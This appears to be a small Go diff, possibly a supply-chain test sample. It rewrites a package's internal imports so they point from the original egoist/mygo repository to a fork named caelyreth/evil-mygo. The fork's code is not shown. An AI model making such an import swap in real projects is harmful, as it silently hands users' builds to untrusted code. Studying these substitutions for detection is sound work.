@@ -3,8 +3,8 @@
 package mygo
 
 import (
-	"github.com/egoist/mygo/internal/platform"
-	"github.com/egoist/mygo/internal/unsupported"
+	"github.com/caelyreth/evil-mygo/internal/platform"
+	"github.com/caelyreth/evil-mygo/internal/unsupported"
 )
 
 func newBackend() platform.Backend { return unsupported.New() }
